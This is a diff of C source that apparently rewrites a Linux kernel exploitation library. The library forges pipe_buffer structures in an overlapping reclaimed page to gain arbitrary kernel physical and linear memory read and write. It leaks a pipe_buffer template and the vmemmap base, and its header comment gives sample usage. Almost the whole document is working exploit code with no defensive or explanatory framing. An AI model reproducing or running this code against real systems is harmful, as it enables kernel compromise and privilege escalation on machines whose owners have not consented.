@@ -1,112 +1,321 @@
 #define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
+#include <errno.h>
+#include <stdbool.h>
+#include <stddef.h>
 #include <stdint.h>
 #include <string.h>
 #include <unistd.h>
-#include <fcntl.h>
-#include <sys/ioctl.h>
 
-typedef uint64_t usize;
+#define PIPE_BUFFER_PAGE_SIZE 0x1000U
+#define PIPE_BUFFER_ENTRY_SIZE 40U
+#define PIPE_BUFFER_DEFAULT_STRUCT_PAGE_SIZE 64U
 
-/**
- * Mirror of the kernel's struct pipe_buffer.
- * Fields might need adjustment based on kernel version.
- */
-struct pipe_buffer_t {
-    unsigned long page;
-    unsigned int offset, len;
-    unsigned long ops;
-    unsigned int flags;
-    unsigned long private;
-};
+typedef ssize_t (*pipe_buffer_page_read_fn)(void *opaque, void *buf, size_t len);
+typedef ssize_t (*pipe_buffer_page_write_fn)(void *opaque, const void *buf, size_t len);
 
 typedef struct {
-    int pipe_fds[2];     // Pipe whose buffer is corrupted
-    usize vmem_base;     // Base of vmemmap for addr -> struct page conversion
-    struct pipe_buffer_t saved_template; // Valid template leaked from kernel
-    int buffer_offset;   // Byte offset of the target pipe_buffer within the reclaimed page
+    uint64_t page;
+    uint32_t offset;
+    uint32_t len;
+    uint64_t ops;
+    uint64_t flags;
+    uint64_t private_data;
+} pipe_buffer_entry_t;
+
+_Static_assert(sizeof(pipe_buffer_entry_t) == PIPE_BUFFER_ENTRY_SIZE,
+               "pipe_buffer_entry_t must match the 40-byte layout");
+
+typedef struct {
+    int victim_pipe[2];
+    pipe_buffer_page_read_fn read_overlap_page;
+    pipe_buffer_page_write_fn write_overlap_page;
+    void *overlap_page_opaque;
+    size_t target_offset;
+    size_t copy_count;
+    size_t struct_page_size;
+    uint64_t vmemmap_base;
+    uint64_t linear_base;
+    bool template_valid;
+    pipe_buffer_entry_t template;
+    uint8_t scratch_page[PIPE_BUFFER_PAGE_SIZE];
 } pipe_buffer_rw_ctx_t;
 
-/**
- * Translates a virtual address to its corresponding struct page pointer.
- * 
- * NOTE: The implementation of this conversion is architecture and 
- * kernel-configuration dependent.
+/*
+ * Sample usage:
+ *
+ *   pipe_buffer_rw_ctx_t ctx;
+ *   init_pipe_buffer_rw(&ctx, pipefd[0], pipefd[1],
+ *                       overlap_read_page, overlap_write_page, opaque,
+ *                       target_offset, 4);
+ *   execute_pipe_buffer_capture_template(&ctx);
+ *   execute_pipe_buffer_set_vmemmap_base_from_leak(&ctx, 0xfffffffff0000000ULL);
+ *   execute_pipe_buffer_set_linear_base(&ctx, leaked_linear_base);
+ *   execute_pipe_buffer_read_linear(&ctx, target_addr, buf, sizeof(buf));
  */
-static usize addr_to_page(usize addr, usize vmem_base) {
-    // Standard arm64/x86_64 vmemmap conversion
-    return ((addr >> 12) << 6) + vmem_base;
+
+static size_t pipe_buffer_max_copy_count(size_t target_offset) {
+    return (PIPE_BUFFER_PAGE_SIZE - target_offset) / sizeof(pipe_buffer_entry_t);
 }
 
-/**
- * Initialize the pipe buffer R/W context.
- */
-int init_pipe_buffer_rw(pipe_buffer_rw_ctx_t *ctx, int pipe_r, int pipe_w, 
-                        usize vmem_base, struct pipe_buffer_t *template, 
-                        int buffer_offset) {
-    ctx->pipe_fds[0] = pipe_r;
-    ctx->pipe_fds[1] = pipe_w;
-    ctx->vmem_base = vmem_base;
-    ctx->buffer_offset = buffer_offset;
-    memcpy(&ctx->saved_template, template, sizeof(struct pipe_buffer_t));
+size_t pipe_buffer_array_allocation_size(unsigned int order) {
+    return PIPE_BUFFER_ENTRY_SIZE * (1U << order);
+}
+
+static int pipe_buffer_read_overlap_page(pipe_buffer_rw_ctx_t *ctx) {
+    ssize_t ret;
+
+    if (!ctx || !ctx->read_overlap_page) {
+        return -EINVAL;
+    }
+
+    ret = ctx->read_overlap_page(ctx->overlap_page_opaque, ctx->scratch_page,
+                                 sizeof(ctx->scratch_page));
+    if (ret != (ssize_t)sizeof(ctx->scratch_page)) {
+        return -EIO;
+    }
+
     return 0;
 }
 
-/**
- * Perform an arbitrary read.
- * 
- * @param spray_write_fd The FD used to overwrite the reclaimed page (e.g., write end of spray pipe).
- * @param addr Target kernel virtual address.
- * @param buf Destination buffer in userspace.
- * @param count Number of bytes to read.
- */
-ssize_t execute_pipe_buffer_read(pipe_buffer_rw_ctx_t *ctx, int spray_write_fd, 
-                                usize addr, void *buf, size_t count) {
-    struct pipe_buffer_t fake_buf;
-    uint8_t page_data[4096];
+static int pipe_buffer_write_overlap_page(pipe_buffer_rw_ctx_t *ctx) {
+    ssize_t ret;
 
-    // 1. Prepare fake pipe_buffer
-    memcpy(&fake_buf, &ctx->saved_template, sizeof(struct pipe_buffer_t));
-    fake_buf.page = addr_to_page(addr, ctx->vmem_base);
-    fake_buf.offset = addr & 0xfff;
-    fake_buf.len = count;
-
-    // 2. Overwrite the kernel object via spray page
-    // We assume the caller provides the FD to the reclaimed page.
-    memset(page_data, 0, 4096);
-    memcpy(page_data + ctx->buffer_offset, &fake_buf, sizeof(struct pipe_buffer_t));
-    
-    if (write(spray_write_fd, page_data, 4096) != 4096) {
-        return -1;
+    if (!ctx || !ctx->write_overlap_page) {
+        return -EINVAL;
     }
 
-    // 3. Trigger the read from the corrupted pipe
-    return read(ctx->pipe_fds[0], buf, count);
+    ret = ctx->write_overlap_page(ctx->overlap_page_opaque, ctx->scratch_page,
+                                  sizeof(ctx->scratch_page));
+    if (ret != (ssize_t)sizeof(ctx->scratch_page)) {
+        return -EIO;
+    }
+
+    return 0;
 }
 
-/**
- * Perform an arbitrary write.
- */
-ssize_t execute_pipe_buffer_write(pipe_buffer_rw_ctx_t *ctx, int spray_write_fd, 
-                                 usize addr, const void *buf, size_t count) {
-    struct pipe_buffer_t fake_buf;
-    uint8_t page_data[4096];
+static uint64_t pipe_buffer_phys_to_struct_page(const pipe_buffer_rw_ctx_t *ctx,
+                                                uint64_t phys_addr) {
+    return ((phys_addr >> 12) * ctx->struct_page_size) + ctx->vmemmap_base;
+}
 
-    // 1. Prepare fake pipe_buffer
-    memcpy(&fake_buf, &ctx->saved_template, sizeof(struct pipe_buffer_t));
-    fake_buf.page = addr_to_page(addr, ctx->vmem_base);
-    fake_buf.offset = addr & 0xfff;
-    fake_buf.len = 0; // len=0 makes the next write use this buffer
+static int pipe_buffer_prepare_target(pipe_buffer_rw_ctx_t *ctx, uint64_t phys_addr,
+                                      uint32_t len) {
+    pipe_buffer_entry_t forged;
+    size_t i;
+    int ret;
 
-    // 2. Overwrite the kernel object
-    memset(page_data, 0, 4096);
-    memcpy(page_data + ctx->buffer_offset, &fake_buf, sizeof(struct pipe_buffer_t));
-
-    if (write(spray_write_fd, page_data, 4096) != 4096) {
-        return -1;
+    if (!ctx || !ctx->template_valid) {
+        return -EINVAL;
+    }
+    if (!ctx->vmemmap_base) {
+        return -EINVAL;
     }
 
-    // 3. Trigger the write to the corrupted pipe
-    return write(ctx->pipe_fds[1], buf, count);
+    ret = pipe_buffer_read_overlap_page(ctx);
+    if (ret < 0) {
+        return ret;
+    }
+
+    forged = ctx->template;
+    forged.page = pipe_buffer_phys_to_struct_page(ctx, phys_addr);
+    forged.offset = (uint32_t)(phys_addr & (PIPE_BUFFER_PAGE_SIZE - 1));
+    forged.len = len;
+
+    for (i = 0; i < ctx->copy_count; i++) {
+        size_t entry_offset = ctx->target_offset + (i * sizeof(pipe_buffer_entry_t));
+        memcpy(ctx->scratch_page + entry_offset, &forged, sizeof(forged));
+    }
+
+    return pipe_buffer_write_overlap_page(ctx);
+}
+
+int init_pipe_buffer_rw(pipe_buffer_rw_ctx_t *ctx, int victim_pipe_read,
+                        int victim_pipe_write,
+                        pipe_buffer_page_read_fn read_overlap_page,
+                        pipe_buffer_page_write_fn write_overlap_page,
+                        void *overlap_page_opaque, size_t target_offset,
+                        size_t copy_count) {
+    if (!ctx || !read_overlap_page || !write_overlap_page) {
+        return -EINVAL;
+    }
+    if (target_offset + sizeof(pipe_buffer_entry_t) > PIPE_BUFFER_PAGE_SIZE) {
+        return -EINVAL;
+    }
+
+    memset(ctx, 0, sizeof(*ctx));
+    ctx->victim_pipe[0] = victim_pipe_read;
+    ctx->victim_pipe[1] = victim_pipe_write;
+    ctx->read_overlap_page = read_overlap_page;
+    ctx->write_overlap_page = write_overlap_page;
+    ctx->overlap_page_opaque = overlap_page_opaque;
+    ctx->target_offset = target_offset;
+    ctx->copy_count = copy_count ? copy_count : 1;
+    ctx->struct_page_size = PIPE_BUFFER_DEFAULT_STRUCT_PAGE_SIZE;
+
+    if (ctx->copy_count > pipe_buffer_max_copy_count(target_offset)) {
+        return -EINVAL;
+    }
+
+    return 0;
+}
+
+int execute_pipe_buffer_capture_template(pipe_buffer_rw_ctx_t *ctx) {
+    int ret;
+
+    if (!ctx) {
+        return -EINVAL;
+    }
+
+    ret = pipe_buffer_read_overlap_page(ctx);
+    if (ret < 0) {
+        return ret;
+    }
+
+    memcpy(&ctx->template, ctx->scratch_page + ctx->target_offset,
+           sizeof(ctx->template));
+    ctx->template_valid = true;
+    return 0;
+}
+
+void execute_pipe_buffer_set_struct_page_size(pipe_buffer_rw_ctx_t *ctx,
+                                              size_t struct_page_size) {
+    if (!ctx || !struct_page_size) {
+        return;
+    }
+
+    ctx->struct_page_size = struct_page_size;
+}
+
+void execute_pipe_buffer_set_vmemmap_base(pipe_buffer_rw_ctx_t *ctx,
+                                          uint64_t vmemmap_base) {
+    if (!ctx) {
+        return;
+    }
+
+    ctx->vmemmap_base = vmemmap_base;
+}
+
+int execute_pipe_buffer_set_vmemmap_base_from_leak(pipe_buffer_rw_ctx_t *ctx,
+                                                   uint64_t region_mask) {
+    if (!ctx || !ctx->template_valid || !region_mask) {
+        return -EINVAL;
+    }
+
+    ctx->vmemmap_base = ctx->template.page & region_mask;
+    return 0;
+}
+
+void execute_pipe_buffer_set_linear_base(pipe_buffer_rw_ctx_t *ctx,
+                                         uint64_t linear_base) {
+    if (!ctx) {
+        return;
+    }
+
+    ctx->linear_base = linear_base;
+}
+
+uint64_t execute_pipe_buffer_leaked_page(const pipe_buffer_rw_ctx_t *ctx) {
+    return ctx ? ctx->template.page : 0;
+}
+
+uint64_t execute_pipe_buffer_leaked_ops(const pipe_buffer_rw_ctx_t *ctx) {
+    return ctx ? ctx->template.ops : 0;
+}
+
+ssize_t execute_pipe_buffer_read_phys(pipe_buffer_rw_ctx_t *ctx, uint64_t phys_addr,
+                                      void *buf, size_t count) {
+    uint8_t *cursor = buf;
+    size_t remaining = count;
+
+    if (!ctx || !buf) {
+        return -EINVAL;
+    }
+
+    while (remaining > 0) {
+        size_t chunk = PIPE_BUFFER_PAGE_SIZE - (phys_addr & (PIPE_BUFFER_PAGE_SIZE - 1));
+        int ret;
+
+        if (chunk > remaining) {
+            chunk = remaining;
+        }
+
+        ret = pipe_buffer_prepare_target(ctx, phys_addr, (uint32_t)chunk);
+        if (ret < 0) {
+            return ret;
+        }
+
+        if (read(ctx->victim_pipe[0], cursor, chunk) != (ssize_t)chunk) {
+            return -EIO;
+        }
+
+        phys_addr += chunk;
+        cursor += chunk;
+        remaining -= chunk;
+    }
+
+    return (ssize_t)count;
+}
+
+ssize_t execute_pipe_buffer_write_phys(pipe_buffer_rw_ctx_t *ctx, uint64_t phys_addr,
+                                       const void *buf, size_t count) {
+    const uint8_t *cursor = buf;
+    size_t remaining = count;
+
+    if (!ctx || !buf) {
+        return -EINVAL;
+    }
+
+    while (remaining > 0) {
+        size_t chunk = PIPE_BUFFER_PAGE_SIZE - (phys_addr & (PIPE_BUFFER_PAGE_SIZE - 1));
+        int ret;
+
+        if (chunk > remaining) {
+            chunk = remaining;
+        }
+
+        ret = pipe_buffer_prepare_target(ctx, phys_addr, 0);
+        if (ret < 0) {
+            return ret;
+        }
+
+        if (write(ctx->victim_pipe[1], cursor, chunk) != (ssize_t)chunk) {
+            return -EIO;
+        }
+
+        phys_addr += chunk;
+        cursor += chunk;
+        remaining -= chunk;
+    }
+
+    return (ssize_t)count;
+}
+
+ssize_t execute_pipe_buffer_read_linear(pipe_buffer_rw_ctx_t *ctx,
+                                        uint64_t linear_addr, void *buf,
+                                        size_t count) {
+    if (!ctx || !ctx->linear_base || linear_addr < ctx->linear_base) {
+        return -EINVAL;
+    }
+
+    return execute_pipe_buffer_read_phys(ctx, linear_addr - ctx->linear_base, buf,
+                                         count);
+}
+
+ssize_t execute_pipe_buffer_write_linear(pipe_buffer_rw_ctx_t *ctx,
+                                         uint64_t linear_addr, const void *buf,
+                                         size_t count) {
+    if (!ctx || !ctx->linear_base || linear_addr < ctx->linear_base) {
+        return -EINVAL;
+    }
+
+    return execute_pipe_buffer_write_phys(ctx, linear_addr - ctx->linear_base,
+                                          buf, count);
+}
+
+void cleanup_pipe_buffer_rw(pipe_buffer_rw_ctx_t *ctx) {
+    if (!ctx) {
+        return;
+    }
+
+    memset(ctx, 0, sizeof(*ctx));
 }
